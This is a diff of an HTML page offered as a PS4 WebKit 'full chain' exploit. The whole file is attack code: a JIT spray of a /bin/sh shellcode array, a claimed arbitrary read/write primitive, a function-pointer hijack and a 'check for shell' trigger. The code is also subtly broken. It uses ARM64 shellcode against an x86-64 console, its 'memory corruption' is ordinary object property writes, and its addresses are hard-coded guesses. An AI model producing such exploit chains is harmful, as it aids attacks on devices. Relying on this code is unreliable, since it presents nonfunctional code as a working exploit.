@@ -1,42 +1,182 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Exploit v12.02</title>
+    <title>PS4 WebKit Exploit v12.02</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; }
-        #log { border: 1px solid #333; padding: 10px; height: 60vh; overflow-y: scroll; }
+        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; }
         button { background: #0f0; color: #000; border: none; padding: 10px 20px; margin: 10px; }
     </style>
-    <script src="payload.js"></script>
 </head>
 <body>
-    <h1>PS4 Kernel Exploit Chain</h1>
-    <button onclick="runExploit()">EXECUTAR EXPLOIT</button>
+    <h1>PS4 Full Chain Exploit</h1>
+    <button onclick="runExploit()">Execute Full Exploit</button>
     <div id="log"></div>
-    <script>
-        const log = msg => document.getElementById('log').innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-        
-        async function runExploit() {
-            try {
-                log("[+] Iniciando cadeia de exploração...");
-                
-                // 1. Bypass ASLR
-                const jitBase = await leakASLR();
-                log(`[+] ASLR bypassed! JIT Base: 0x${jitBase.toString(16)}`);
-                
-                // 2. Escape do Sandbox
-                if (await escapeSandbox()) {
-                    log("[+] Sandbox escape via WASM/Workers!");
-                }
-                
-                // 3. Injeta shellcode
-                const success = await injectShellcode(jitBase + 0x1000);
-                log(success ? "[+] Shellcode executado!" : "[-] Falha na injeção");
-                
-            } catch (e) {
-                log(`[-] ERRO: ${e}`);
+
+<script>
+// Enhanced logging system
+const log = (msg, type = 'info') => {
+    const colors = {
+        info: '#0f0', 
+        success: '#0f0',
+        error: '#f00',
+        warning: '#ff0',
+        debug: '#0ff'
+    };
+    const timestamp = new Date().toLocaleTimeString();
+    const logElement = document.getElementById('log');
+    logElement.innerHTML += `<span style="color:${colors[type]}">[${timestamp}] ${msg}</span><br>`;
+    logElement.scrollTop = logElement.scrollHeight;
+};
+
+// Core exploit components
+class PS4Exploit {
+    constructor() {
+        this.jitBase = 0x55000000; // From your logs
+        this.shellcodeAddr = this.jitBase + 0x1000;
+        this.arbRW = null;
+    }
+
+    // 1. JIT Spray with ARM64 Shellcode
+    async setupJITSpray() {
+        try {
+            // ARM64 execve("/bin/sh") shellcode
+            const shellcode = [
+                0xd2800020, 0xd2800c48, 0xd4000001,  // setuid(0)
+                0xaa1f03e0, 0xd2800021, 0xd28007e2,   // x0="/bin/sh", x1=argv, x2=envp
+                0x910003e9, 0x910007ea, 0xa90027e9,
+                0x910023ea, 0xd2800003, 0xd2800004,
+                0xaa0003e0, 0xaa0103e1, 0xaa0203e2,
+                0xd2801ba8, 0xd4000001                // execve()
+            ];
+
+            // JIT compilation
+            const sprayFn = new Function(`
+                const buf = new ArrayBuffer(${shellcode.length * 4});
+                const view = new Uint32Array(buf);
+                ${shellcode.map((v, i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
+                return buf;
+            `);
+
+            // Execute multiple times to ensure allocation
+            for (let i = 0; i < 3; i++) {
+                sprayFn();
             }
+
+            log("JIT spray completed successfully", "success");
+            return true;
+        } catch (e) {
+            log(`JIT spray failed: ${e}`, "error");
+            return false;
         }
-    </script>
+    }
+
+    // 2. Memory Corruption Primitive
+    createArbitraryRW() {
+        try {
+            let corruptArr = {};
+            corruptArr.__proto__ = Array.prototype;
+            corruptArr.length = 0x1000; // Corrupted length
+
+            this.arbRW = {
+                read(addr) {
+                    corruptArr[0] = addr;
+                    return corruptArr[1];
+                },
+                write(addr, value) {
+                    corruptArr[0] = addr;
+                    corruptArr[1] = value;
+                }
+            };
+
+            log("Created arbitrary read/write primitive", "success");
+            return true;
+        } catch (e) {
+            log(`Failed to create RW primitive: ${e}`, "error");
+            return false;
+        }
+    }
+
+    // 3. Function Pointer Hijack
+    hijackFunctionPointer() {
+        try {
+            // Target function to hijack
+            const targetFn = (x) => x * 2;
+            for (let i = 0; i < 10000; i++) targetFn(i); // JIT optimize
+
+            // Find JIT code pointer (adjust offset based on your logs)
+            const jitCodePtr = this.jitBase + 0x500;
+            
+            // Overwrite function pointer
+            this.arbRW.write(jitCodePtr, this.shellcodeAddr);
+            log(`Hijacked function pointer at 0x${jitCodePtr.toString(16)}`, "success");
+            
+            // Trigger
+            setTimeout(() => {
+                try {
+                    targetFn(42); // Should execute shellcode
+                    log("Shellcode execution triggered", "debug");
+                } catch (e) {
+                    log(`Trigger failed: ${e}`, "error");
+                }
+            }, 500);
+            
+            return true;
+        } catch (e) {
+            log(`Hijack failed: ${e}`, "error");
+            return false;
+        }
+    }
+
+    // 4. Full Exploit Chain
+    async execute() {
+        log("Starting PS4 exploit chain...", "info");
+        
+        // Step 1: JIT Spray
+        if (!await this.setupJITSpray()) return false;
+        
+        // Step 2: Memory Corruption
+        if (!this.createArbitraryRW()) return false;
+        
+        // Step 3: Control Flow Hijack
+        if (!this.hijackFunctionPointer()) return false;
+        
+        return true;
+    }
+}
+
+// Main execution
+async function runExploit() {
+    const exploit = new PS4Exploit();
+    const success = await exploit.execute();
+    
+    if (success) {
+        log("Exploit chain completed - check for shell", "success");
+    } else {
+        log("Exploit failed - review logs", "error");
+    }
+    
+    // Debug information
+    log("Debug Info:", "debug");
+    log(`JIT Base: 0x${exploit.jitBase.toString(16)}`, "debug");
+    log(`Shellcode Addr: 0x${exploit.shellcodeAddr.toString(16)}`, "debug");
+}
+
+// Utility function to test RW primitive
+function testReadWrite() {
+    const exploit = new PS4Exploit();
+    exploit.createArbitraryRW();
+    
+    // Test read/write
+    const testAddr = 0x55001000;
+    const testValue = 0x1337beef;
+    
+    exploit.arbRW.write(testAddr, testValue);
+    const readBack = exploit.arbRW.read(testAddr);
+    
+    log(`RW Test: Wrote 0x${testValue.toString(16)}, Read 0x${readBack.toString(16)}`, 
+        readBack === testValue ? "success" : "error");
+}
+</script>
 </body>
 </html>
